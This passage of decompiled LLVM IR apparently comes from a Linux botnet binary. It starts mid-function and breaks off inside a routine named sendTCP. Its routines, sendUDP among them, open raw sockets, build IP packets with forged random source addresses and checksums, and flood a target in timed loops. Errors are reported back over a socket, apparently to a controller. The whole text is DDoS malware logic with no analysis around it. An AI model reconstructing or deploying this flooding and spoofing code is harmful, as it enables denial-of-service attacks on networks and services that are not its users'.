  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f330 = load i32, i32* @fp, align 4
  store i32 %v3_f330, i32* %stack_var_-16, align 4
  store i32 62264, i32* %stack_var_-4, align 4
  %v13_f330 = ptrtoint i32* %stack_var_-16 to i32
  %v2_f334 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f334, i32* @fp, align 4
  %v3_f354 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_f364 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_f378 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_f384 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_f384, i32* @r0, align 4
  %v2_f390 = call i32 @bzero(i32 %v2_f384, i32 16)
  %v1_f398 = add i32 %v1_f378, 16
  %v2_f398 = inttoptr i32 %v1_f398 to i32*
  %v3_f398 = load i32, i32* %v2_f398, align 4
  %v1_f39c = inttoptr i32 %v3_f398 to i32*
  %v2_f39c = load i32, i32* %v1_f39c, align 4
  %v1_f3a4 = add i32 %v1_f378, 12
  %v2_f3a4 = inttoptr i32 %v1_f3a4 to i32*
  %v3_f3a4 = load i32, i32* %v2_f3a4, align 4
  store i32 %v3_f3a4, i32* @r2, align 4
  %v2_f3b0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_f3b0, i32* @r3, align 4
  %v5_f3bc = call i32 @bcopy(i32 %v2_f39c, i32 %v2_f3b0, i32 %v3_f3a4, i32 %v2_f3b0, i32 ptrtoint (i32* @0 to i32))
  %v1_f3c4 = add i32 %v1_f378, 8
  %v2_f3c4 = inttoptr i32 %v1_f3c4 to i32*
  %v3_f3c4 = load i32, i32* %v2_f3c4, align 4
  %v3_f3cc = urem i32 %v3_f3c4, 65536
  store i32 %v3_f3cc, i32* %stack_var_-52, align 4
  %v2_f3f0 = ptrtoint i32* %stack_var_-196 to i32
  %v2_f4a4 = add i32 %v2_f364, %arg3
  %v2_f44c = add i32 %v13_f330, -180
  br label %dec_label_pc_f3ec

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f4c8, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_f4cc, %dec_label_pc_f4c8 ]
  store i32 ptrtoint ([36 x i8*]* @global_var_1f6e0.553 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_f3f0, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1f6e0.553 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_f404 = call i32 @memcpy()
  %v0_f408 = call i32 @rand()
  %v1_f418 = zext i32 %v0_f408 to i64
  %v4_f418 = mul nuw nsw i64 %v1_f418, 954437177
  %v3_f41c1 = udiv i64 %v4_f418, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_f4c8, label %dec_label_pc_f468

dec_label_pc_f468:                                ; preds = %dec_label_pc_f3ec
  %v3_f4283 = mul nuw nsw i64 %v3_f41c1, 4
  %v3_f428 = trunc i64 %v3_f4283 to i32
  %v2_f430.neg = sub i32 %v0_f408, %v3_f428
  %v3_f42c5 = mul nuw nsw i64 %v3_f41c1, 32
  %v3_f42c = trunc i64 %v3_f42c5 to i32
  %v2_f434 = sub i32 %v2_f430.neg, %v3_f42c
  %v3_f444 = mul i32 %v2_f434, 4
  %v2_f450 = add i32 %v2_f44c, %v3_f444
  %v1_f454 = inttoptr i32 %v2_f450 to i32*
  %v2_f454 = load i32, i32* %v1_f454, align 4
  %v5_f478 = call i32 @__libc_send(i32 %v3_f354, i32 %v2_f454, i32 65, i32 0)
  %v3_f48c = call i32 @__libc_connect(i32 %v3_f354, i32 %v2_f384, i32 16)
  %v2_f494 = call i32 @__GI_time(i32* null)
  %v5_f4ac = icmp slt i32 %v2_f494, %v2_f4a4
  br i1 %v5_f4ac, label %dec_label_pc_f4c0, label %dec_label_pc_f4b0

dec_label_pc_f4b0:                                ; preds = %dec_label_pc_f468
  %v1_f4b4 = call i32 @__GI_close(i32 %v3_f354)
  %v1_f4bc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_f4c0

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f468, %dec_label_pc_f4b0
  br label %dec_label_pc_f4c8

dec_label_pc_f4c8:                                ; preds = %dec_label_pc_f3ec, %dec_label_pc_f4c0
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_f3ec ], [ 0, %dec_label_pc_f4c0 ]
  %v1_f4cc = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_f3ec

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_f384, { 0, 2, 1 }
  uselistorder i32 %v1_f378, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_f4c8, { 1, 0 }
  uselistorder label %dec_label_pc_f4c0, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 62700, i32* %stack_var_-4, align 4
  %v2_f4e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f4e8, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_f50c = icmp eq i32 %arg2, 0
  br i1 %v2_f50c, label %dec_label_pc_f514, label %dec_label_pc_f52c

dec_label_pc_f514:                                ; preds = %entry
  %v0_f514 = call i32 @rand_cmwc()
  br label %dec_label_pc_f548

dec_label_pc_f52c:                                ; preds = %entry
  %v3_f534 = urem i32 %arg2, 65536
  %v1_f53c = call i32 @__GI_htons(i32 %v3_f534)
  br label %dec_label_pc_f548

dec_label_pc_f548:                                ; preds = %dec_label_pc_f514, %dec_label_pc_f52c
  %v3_f558 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_f560 = icmp eq i32 %v3_f558, 0
  br i1 %v2_f560, label %dec_label_pc_f568, label %dec_label_pc_fb50

dec_label_pc_f568:                                ; preds = %dec_label_pc_f548
  store i32 8, i32* @r2, align 4
  %v2_f57c = bitcast i32* %stack_var_-72 to i8*
  %v3_f57c = call i32 @__GI_memset(i8* %v2_f57c, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_f58c = icmp eq i32 %arg4, 32
  br i1 %v7_f58c, label %dec_label_pc_f594, label %dec_label_pc_f718

dec_label_pc_f594:                                ; preds = %dec_label_pc_f568
  store i32 17, i32* @r2, align 4
  %v3_f5a0 = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_f5b0 = icmp eq i32 %v3_f5a0, 0
  br i1 %v2_f5b0, label %dec_label_pc_f5b8, label %dec_label_pc_f5d0

dec_label_pc_f5b8:                                ; preds = %dec_label_pc_f594
  %v2_f5bc = load i32, i32* @global_var_299a0.50, align 4
  %v3_f5c8 = call i32 @sockprintf(i32 %v2_f5bc, i32 ptrtoint ([27 x i8]* @global_var_1f770.557 to i32))
  br label %dec_label_pc_fb50

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_f594
  %v3_f5d0 = load i32, i32* %stack_var_0, align 4
  %v1_f5d4 = add i32 %v3_f5d0, 1
  %v1_f5dc = call i32 @malloc(i32 %v1_f5d4)
  %v2_f5ec = icmp eq i32 %v1_f5dc, 0
  br i1 %v2_f5ec, label %dec_label_pc_fb50, label %dec_label_pc_f5f4

dec_label_pc_f5f4:                                ; preds = %dec_label_pc_f5d0
  %v3_f5f4 = load i32, i32* %stack_var_0, align 4
  %v1_f5f8 = add i32 %v3_f5f4, 1
  store i32 %v1_f5f8, i32* @r2, align 4
  %v2_f608 = inttoptr i32 %v1_f5dc to i8*
  %v3_f608 = call i32 @__GI_memset(i8* %v2_f608, i32 0)
  %v2_f614 = call i32 @makeRandomStr(i32 %v1_f5dc, i32 %v3_f5f4)
  %v2_f61c = call i32 @__GI_time(i32* null)
  %v2_f628 = add i32 %v2_f61c, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_f644 = ptrtoint i32* %stack_var_-80 to i32
  %v3_f6e0 = mul i32 %arg8, 4
  %v3_f6f0 = mul i32 %arg8, 1000
  br label %dec_label_pc_f640.outer

dec_label_pc_f640.outer:                          ; preds = %dec_label_pc_f708, %dec_label_pc_f6d8, %dec_label_pc_f5f4
  %stack_var_-120.0.ph = phi i32 [ 0, %dec_label_pc_f5f4 ], [ %v1_f6c0, %dec_label_pc_f6d8 ], [ %v1_f6c0, %dec_label_pc_f708 ]
  %stack_var_-116.0.ph = phi i32 [ 0, %dec_label_pc_f5f4 ], [ 0, %dec_label_pc_f6d8 ], [ %v1_f70c, %dec_label_pc_f708 ]
  br label %dec_label_pc_f640

dec_label_pc_f640:                                ; preds = %dec_label_pc_f640.outer, %dec_label_pc_f6b0
  %stack_var_-120.0 = phi i32 [ 0, %dec_label_pc_f6b0 ], [ %stack_var_-120.0.ph, %dec_label_pc_f640.outer ]
  %v3_f640 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f640, i32* %r2.global-to-local, align 4
  %v6_f664 = call i32 @__libc_sendto(i32 %v3_f5a0, i32 %v1_f5dc, i32 %v3_f640, i32 0, i32 %v2_f644, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_f670 = icmp eq i32 %stack_var_-120.0, %arg6
  br i1 %v9_f670, label %dec_label_pc_f678, label %dec_label_pc_f6bc

dec_label_pc_f678:                                ; preds = %dec_label_pc_f640
  br i1 %v2_f50c, label %dec_label_pc_f684, label %dec_label_pc_f698

dec_label_pc_f684:                                ; preds = %dec_label_pc_f678
  %v0_f684 = call i32 @rand_cmwc()
  br label %dec_label_pc_f698

dec_label_pc_f698:                                ; preds = %dec_label_pc_f678, %dec_label_pc_f684
  %v2_f69c = call i32 @__GI_time(i32* null)
  store i32 %v2_f69c, i32* %r2.global-to-local, align 4
  %v8_f6ac = icmp sgt i32 %v2_f69c, %v2_f628
  br i1 %v8_f6ac, label %dec_label_pc_fb50, label %dec_label_pc_f6b0

dec_label_pc_f6b0:                                ; preds = %dec_label_pc_f698
  br label %dec_label_pc_f640

dec_label_pc_f6bc:                                ; preds = %dec_label_pc_f640
  %v1_f6c0 = add i32 %stack_var_-120.0, 1
  store i32 %stack_var_-116.0.ph, i32* %r2.global-to-local, align 4
  %v9_f6d0 = icmp eq i32 %stack_var_-116.0.ph, %arg7
  br i1 %v9_f6d0, label %dec_label_pc_f6d8, label %dec_label_pc_f708

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f6bc
  store i32 %v3_f6e0, i32* %r2.global-to-local, align 4
  %v1_f6f8 = call i32 @usleep(i32 %v3_f6f0)
  br label %dec_label_pc_f640.outer

dec_label_pc_f708:                                ; preds = %dec_label_pc_f6bc
  %v1_f70c = add i32 %stack_var_-116.0.ph, 1
  store i32 %v1_f70c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f640.outer

dec_label_pc_f718:                                ; preds = %dec_label_pc_f568
  store i32 17, i32* @r2, align 4
  %v3_f72c = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_f73c = icmp eq i32 %v3_f72c, 0
  br i1 %v2_f73c, label %dec_label_pc_f744, label %dec_label_pc_f75c

dec_label_pc_f744:                                ; preds = %dec_label_pc_f718
  %v2_f748 = load i32, i32* @global_var_299a0.50, align 4
  %v3_f754 = call i32 @sockprintf(i32 %v2_f748, i32 ptrtoint ([27 x i8]* @global_var_1f770.557 to i32))
  br label %dec_label_pc_fb4c

dec_label_pc_f75c:                                ; preds = %dec_label_pc_f718
  store i32 1, i32* %stack_var_-84, align 4
  %v2_f764 = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* @r2, align 4
  %v5_f780 = call i32 @__GI_setsockopt(i32 %v3_f72c, i32 0, i32 3, i32 %v2_f764, i32 4)
  %v1_f788 = icmp slt i32 %v5_f780, 0
  br i1 %v1_f788, label %dec_label_pc_f790, label %dec_label_pc_f7a8

dec_label_pc_f790:                                ; preds = %dec_label_pc_f75c
  %v2_f794 = load i32, i32* @global_var_299a0.50, align 4
  %v3_f7a0 = call i32 @sockprintf(i32 %v2_f794, i32 ptrtoint ([33 x i8]* @global_var_1f78c.559 to i32))
  br label %dec_label_pc_fb4c

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f75c
  br label %dec_label_pc_f7b4

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f7a8, %dec_label_pc_f7b4
  %v1_f7ec23 = phi i32 [ 49, %dec_label_pc_f7a8 ], [ %v1_f7ec, %dec_label_pc_f7b4 ]
  %v2_f7b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_f7b8, i32* @r4, align 4
  %v0_f7c4 = call i32 @rand_cmwc()
  %v0_f7cc = load i32, i32* @r4, align 4
  %v2_f7cc = xor i32 %v0_f7cc, %v0_f7c4
  %v1_f7d4 = call i32 @srand(i32 %v2_f7cc)
  %v0_f7d8 = call i32 @rand()
  %v1_f7e4 = call i32 @init_rand(i32 %v0_f7d8)
  %v1_f7ec = add nsw i32 %v1_f7ec23, -1
  %v3_f7f8 = icmp eq i32 %v1_f7ec23, 0
  br i1 %v3_f7f8, label %dec_label_pc_f800, label %dec_label_pc_f7b4

dec_label_pc_f800:                                ; preds = %dec_label_pc_f7b4
  %v2_f804 = icmp eq i32 %arg4, 0
  br i1 %v2_f804, label %dec_label_pc_f830, label %dec_label_pc_f818

dec_label_pc_f818:                                ; preds = %dec_label_pc_f800
  %v1_f81c = sub i32 32, %arg4
  store i32 %v1_f81c, i32* %r2.global-to-local, align 4
  %v1_f828 = shl i32 -1, %v1_f81c
  br label %dec_label_pc_f830

dec_label_pc_f830:                                ; preds = %dec_label_pc_f800, %dec_label_pc_f818
  %storemerge10 = phi i32 [ %v1_f828, %dec_label_pc_f818 ], [ 0, %dec_label_pc_f800 ]
  %v3_f830 = load i32, i32* %stack_var_0, align 4
  %v1_f834 = add i32 %v3_f830, 28
  %v1_f844 = add i32 %v3_f830, 42
  %v3_f848 = and i32 %v1_f844, -8
  %v1_f850 = load i32, i32* @sp, align 4
  %v2_f850 = sub i32 %v1_f850, %v3_f848
  %v1_f854 = add i32 %v2_f850, 8
  store i32 %v1_f854, i32* %r2.global-to-local, align 4
  %v1_f860 = add i32 %v2_f850, 15
  %v3_f864 = and i32 %v1_f860, -8
  %v1_f884 = add i32 %v3_f864, 20
  %v5_f888 = inttoptr i32 %v1_f884 to i16*
  %v3_f88c = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_f88c, i32* @r4, align 4
  %v1_f894 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_f8a0 = call i32 @__GI_htonl(i32 %v1_f894)
  store i32 %v1_f8a0, i32* %r2.global-to-local, align 4
  %v3_f8a8 = load i32, i32* %stack_var_0, align 4
  %v1_f8ac = add i32 %v3_f8a8, 8
  %v1_f8b0 = load i32, i32* @sp, align 4
  %v2_f8b0 = inttoptr i32 %v1_f8b0 to i32*
  store i32 %v1_f8ac, i32* %v2_f8b0, align 4
  %v0_f8b8 = load i32, i32* @r4, align 4
  %v4_f8c0 = inttoptr i32 %v3_f864 to i8*
  %v5_f8c0 = call i32 @makeIPPacket(i8* %v4_f8c0, i32 %v0_f8b8, i32 %v1_f8a0, i32 17)
  %v3_f8c4 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_f8c4, 8
  %v3_f8d8 = urem i32 %fold, 65536
  %v1_f8e0 = call i32 @__GI_htons(i32 %v3_f8d8)
  %sext = mul i32 %v1_f8e0, 65536
  %v1_f8e4 = sdiv i32 %sext, 65536
  store i32 %v1_f8e4, i32* %r2.global-to-local, align 4
  %v1_f8f0 = trunc i32 %v1_f8e4 to i16
  %v3_f8f0 = add i32 %v3_f864, 24
  %v4_f8f0 = inttoptr i32 %v3_f8f0 to i16*
  store i16 %v1_f8f0, i16* %v4_f8f0, align 8
  %v0_f8f4 = call i32 @rand_cmwc()
  %v3_f900 = urem i32 %v0_f8f4, 65536
  store i32 %v3_f900, i32* %r2.global-to-local, align 4
  %v1_f908 = trunc i32 %v0_f8f4 to i16
  store i16 %v1_f908, i16* %v5_f888, align 4
  br i1 %v2_f50c, label %dec_label_pc_f918, label %dec_label_pc_f930

dec_label_pc_f918:                                ; preds = %dec_label_pc_f830
  %v0_f918 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_f918 to i16
  br label %dec_label_pc_f94c

dec_label_pc_f930:                                ; preds = %dec_label_pc_f830
  %v3_f938 = urem i32 %arg2, 65536
  %v1_f940 = call i32 @__GI_htons(i32 %v3_f938)
  %extract.t91 = trunc i32 %v1_f940 to i16
  br label %dec_label_pc_f94c

dec_label_pc_f94c:                                ; preds = %dec_label_pc_f918, %dec_label_pc_f930
  %v0_f918.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_f918 ], [ %extract.t91, %dec_label_pc_f930 ]
  %v3_fa38.pre-phi = phi i32 [ 0, %dec_label_pc_f918 ], [ %v3_f938, %dec_label_pc_f930 ]
  %v3_f954 = add i32 %v3_f864, 22
  %v4_f954 = inttoptr i32 %v3_f954 to i16*
  store i16 %v0_f918.sink.off0, i16* %v4_f954, align 2
  store i32 %v1_f884, i32* %r2.global-to-local, align 4
  %v3_f960 = add i32 %v3_f864, 26
  %v4_f960 = inttoptr i32 %v3_f960 to i16*
  store i16 0, i16* %v4_f960, align 2
  %v1_f968 = add i32 %v3_f864, 28
  %v3_f970 = load i32, i32* %stack_var_0, align 4
  %v2_f974 = call i32 @makeRandomStr(i32 %v1_f968, i32 %v3_f970)
  store i32 %v3_f864, i32* %r2.global-to-local, align 4
  %v1_f984 = or i32 %v3_f864, 2
  %v2_f984 = inttoptr i32 %v1_f984 to i16*
  %v3_f984 = load i16, i16* %v2_f984, align 2
  %v4_f984 = zext i16 %v3_f984 to i32
  %v2_f990 = inttoptr i32 %v3_f864 to i16*
  %v3_f990 = call i32 @csum(i16* %v2_f990, i32 %v4_f984)
  %sext4 = mul i32 %v3_f990, 65536
  %v1_f994 = sdiv i32 %sext4, 65536
  store i32 %v1_f994, i32* %r2.global-to-local, align 4
  %v1_f9a0 = trunc i32 %v1_f994 to i16
  %v3_f9a0 = add i32 %v3_f864, 10
  %v4_f9a0 = inttoptr i32 %v3_f9a0 to i16*
  store i16 %v1_f9a0, i16* %v4_f9a0, align 2
  %v2_f9a8 = call i32 @__GI_time(i32* null)
  %v2_f9b4 = add i32 %v2_f9a8, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_f9d0 = ptrtoint i32* %stack_var_-80 to i32
  %v3_fa6c = or i32 %v3_f864, 4
  %v4_fa6c = inttoptr i32 %v3_fa6c to i16*
  %v2_fa8c = add i32 %v3_f864, 12
  %v3_fa8c = inttoptr i32 %v2_fa8c to i32*
  %v3_fb14 = mul i32 %arg8, 4
  %v3_fb24 = mul i32 %arg8, 1000
  br label %dec_label_pc_f9cc.outer

dec_label_pc_f9cc.outer:                          ; preds = %dec_label_pc_fb3c, %dec_label_pc_fb0c, %dec_label_pc_f94c
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_f94c ], [ %v1_faf4, %dec_label_pc_fb0c ], [ %v1_faf4, %dec_label_pc_fb3c ]
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_f94c ], [ 0, %dec_label_pc_fb0c ], [ %v1_fb40, %dec_label_pc_fb3c ]
  br label %dec_label_pc_f9cc

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f9cc.outer, %dec_label_pc_fae4
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_fae4 ], [ %stack_var_-112.0.ph, %dec_label_pc_f9cc.outer ]
  store i32 %v3_f864, i32* %r2.global-to-local, align 4
  %v1_f9d4 = load i32, i32* @sp, align 4
  %v2_f9d4 = inttoptr i32 %v1_f9d4 to i32*
  store i32 %v2_f9d0, i32* %v2_f9d4, align 4
  %v1_f9dc = load i32, i32* @sp, align 4
  %v2_f9dc = add i32 %v1_f9dc, 4
  %v3_f9dc = inttoptr i32 %v2_f9dc to i32*
  store i32 16, i32* %v3_f9dc, align 4
  %v0_f9e4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_f834, i32* %r2.global-to-local, align 4
  %v6_f9f0 = call i32 @__libc_sendto(i32 %v3_f72c, i32 %v0_f9e4, i32 %v1_f834, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_f9f4 = call i32 @rand_cmwc()
  %v3_fa00 = urem i32 %v0_f9f4, 65536
  store i32 %v3_fa00, i32* %r2.global-to-local, align 4
  %v1_fa08 = trunc i32 %v0_f9f4 to i16
  store i16 %v1_fa08, i16* %v5_f888, align 4
  br i1 %v2_f50c, label %dec_label_pc_fa18, label %dec_label_pc_fa30

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f9cc
  %v0_fa18 = call i32 @rand_cmwc()
  %extract.t92 = trunc i32 %v0_fa18 to i16
  br label %dec_label_pc_fa4c

dec_label_pc_fa30:                                ; preds = %dec_label_pc_f9cc
  %v1_fa40 = call i32 @__GI_htons(i32 %v3_fa38.pre-phi)
  %extract.t93 = trunc i32 %v1_fa40 to i16
  br label %dec_label_pc_fa4c

dec_label_pc_fa4c:                                ; preds = %dec_label_pc_fa18, %dec_label_pc_fa30
  %v0_fa18.sink.off0 = phi i16 [ %extract.t92, %dec_label_pc_fa18 ], [ %extract.t93, %dec_label_pc_fa30 ]
  %v4_fa50 = sext i16 %v0_fa18.sink.off0 to i32
  store i32 %v4_fa50, i32* %r2.global-to-local, align 4
  store i16 %v0_fa18.sink.off0, i16* %v4_f954, align 2
  %v0_fa58 = call i32 @rand_cmwc()
  %v3_fa64 = urem i32 %v0_fa58, 65536
  store i32 %v3_fa64, i32* %r2.global-to-local, align 4
  %v1_fa6c = trunc i32 %v0_fa58 to i16
  store i16 %v1_fa6c, i16* %v4_fa6c, align 4
  %v1_fa74 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_fa80 = call i32 @__GI_htonl(i32 %v1_fa74)
  store i32 %v1_fa80, i32* %v3_fa8c, align 4
  store i32 %v3_f864, i32* %r2.global-to-local, align 4
  %v3_fa9c = load i16, i16* %v2_f984, align 2
  %v4_fa9c = zext i16 %v3_fa9c to i32
  %v3_faa8 = call i32 @csum(i16* %v2_f990, i32 %v4_fa9c)
  %v1_fab8 = trunc i32 %v3_faa8 to i16
  store i16 %v1_fab8, i16* %v4_f9a0, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_fac4 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_fac4, label %dec_label_pc_facc, label %dec_label_pc_faf0

dec_label_pc_facc:                                ; preds = %dec_label_pc_fa4c
  %v2_fad0 = call i32 @__GI_time(i32* null)
  store i32 %v2_fad0, i32* %r2.global-to-local, align 4
  %v8_fae0 = icmp sgt i32 %v2_fad0, %v2_f9b4
  br i1 %v8_fae0, label %dec_label_pc_fb4c, label %dec_label_pc_fae4

dec_label_pc_fae4:                                ; preds = %dec_label_pc_facc
  br label %dec_label_pc_f9cc

dec_label_pc_faf0:                                ; preds = %dec_label_pc_fa4c
  %v1_faf4 = add i32 %stack_var_-112.0, 1
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_fb04 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_fb04, label %dec_label_pc_fb0c, label %dec_label_pc_fb3c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_faf0
  store i32 %v3_fb14, i32* %r2.global-to-local, align 4
  %v1_fb2c = call i32 @usleep(i32 %v3_fb24)
  br label %dec_label_pc_f9cc.outer

dec_label_pc_fb3c:                                ; preds = %dec_label_pc_faf0
  %v1_fb40 = add i32 %stack_var_-108.0.ph, 1
  store i32 %v1_fb40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f9cc.outer

dec_label_pc_fb4c:                                ; preds = %dec_label_pc_facc, %dec_label_pc_f790, %dec_label_pc_f744
  %v1_fb5830 = phi i32 [ %v3_f7a0, %dec_label_pc_f790 ], [ %v3_f754, %dec_label_pc_f744 ], [ %v2_fad0, %dec_label_pc_facc ]
  br label %dec_label_pc_fb50

dec_label_pc_fb50:                                ; preds = %dec_label_pc_f698, %dec_label_pc_f548, %dec_label_pc_f5d0, %dec_label_pc_f5b8, %dec_label_pc_fb4c
  %v1_fb58 = phi i32 [ %v3_f558, %dec_label_pc_f548 ], [ 0, %dec_label_pc_f5d0 ], [ %v3_f5c8, %dec_label_pc_f5b8 ], [ %v1_fb5830, %dec_label_pc_fb4c ], [ %v2_f69c, %dec_label_pc_f698 ]
  ret i32 %v1_fb58

; uselistorder directives
  uselistorder i32 %v1_fb40, { 1, 0 }
  uselistorder i32 %v1_faf4, { 1, 0 }
  uselistorder i32 %v0_fa58, { 1, 0 }
  uselistorder i16 %v0_fa18.sink.off0, { 1, 0 }
  uselistorder i32 %v0_f9f4, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v1_f994, { 1, 0 }
  uselistorder i32 %v3_f938, { 1, 0 }
  uselistorder i32 %v0_f8f4, { 1, 0 }
  uselistorder i32 %v1_f8e4, { 1, 0 }
  uselistorder i32 %v3_f864, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_f834, { 1, 0 }
  uselistorder i32 %v1_f70c, { 1, 0 }
  uselistorder i32 %v1_f6c0, { 1, 0 }
  uselistorder i32 %v3_f640, { 1, 0 }
  uselistorder i32 %stack_var_-116.0.ph, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i32 26, { 1, 2, 0 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_fb50, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_fa4c, { 1, 0 }
  uselistorder label %dec_label_pc_f9cc, { 1, 0 }
  uselistorder label %dec_label_pc_f94c, { 1, 0 }
  uselistorder label %dec_label_pc_f830, { 1, 0 }
  uselistorder label %dec_label_pc_f7b4, { 1, 0 }
  uselistorder label %dec_label_pc_f698, { 1, 0 }
  uselistorder label %dec_label_pc_f640, { 1, 0 }
  uselistorder label %dec_label_pc_f548, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 64372, i32* %stack_var_-4, align 4
  %v2_fb70 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fb70, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_fba4 = icmp eq i32 %arg2, 0
  br i1 %v2_fba4, label %dec_label_pc_fbac, label %dec_label_pc_fbc4

dec_label_pc_fbac:                                ; preds = %entry
  %v0_fbac = call i32 @rand_cmwc()
  br label %dec_label_pc_fbe0

dec_label_pc_fbc4:                                ; preds = %entry
  %v3_fbcc = urem i32 %arg2, 65536
  %v1_fbd4 = call i32 @__GI_htons(i32 %v3_fbcc)
  br label %dec_label_pc_fbe0

dec_label_pc_fbe0:                                ; preds = %dec_label_pc_fbac, %dec_label_pc_fbc4
  %v3_fbf0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_fbf8 = icmp eq i32 %v3_fbf0, 0
  br i1 %v2_fbf8, label %dec_label_pc_fc04, label %dec_label_pc_10240

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbe0
  store i32 8, i32* @r2, align 4
  %v2_fc18 = bitcast i32* %stack_var_-60 to i8*
  %v3_fc18 = call i32 @__GI_memset(i8* %v2_fc18, i32 0)
  store i32 6, i32* @r2, align 4
  %v3_fc28 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_fc38 = icmp eq i32 %v3_fc28, 0
